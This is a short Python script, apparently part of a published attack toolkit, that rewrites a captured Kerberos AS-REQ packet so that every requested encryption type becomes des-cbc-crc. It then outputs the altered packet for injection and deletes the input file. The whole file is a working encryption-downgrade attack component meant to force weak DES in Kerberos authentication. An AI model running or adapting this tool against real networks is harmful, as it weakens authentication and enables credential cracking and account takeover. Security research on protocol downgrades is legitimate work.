#!/usr/bin/env python

"""A tool for rewriting a AS-REQ packet to downgrade to des-cbc-crc"""

import os
import sys
from pyasn1.codec.ber import decoder
from pyasn1.codec.der import encoder
from pyasn1.type import univ

__author__    = "David Hulton"
__license__   = "BSD"
__copyright__ = "Copyright 2016, David Hulton"

def main(argv):
	try:
		infile  = argv[0]
	except:
		print "usage: ./krb5-downgrade-asreq.py <infile>"
		sys.exit(0)

	fin  = open(infile, 'r')

	data = fin.read()
	data_len = len(data)
	fin.close()

	krb_preauth_req, temp = decoder.decode(data[4:])

	for i in range(0, len(krb_preauth_req[3][7])):
		krb_preauth_req[3][7][i] = univ.Integer(1)

	payload_out = data[:4]
	payload_out += encoder.encode(krb_preauth_req)

	# log what we're doing
	fout = open(infile +".in", "w")
	fout.write(data)
	fout.close()

	fout = open(infile +".out", "w")
	fout.write(payload_out)
	fout.close()

	sys.stdout.write(payload_out)
	os.remove(infile)

if __name__ == '__main__':
	main(sys.argv[1:])
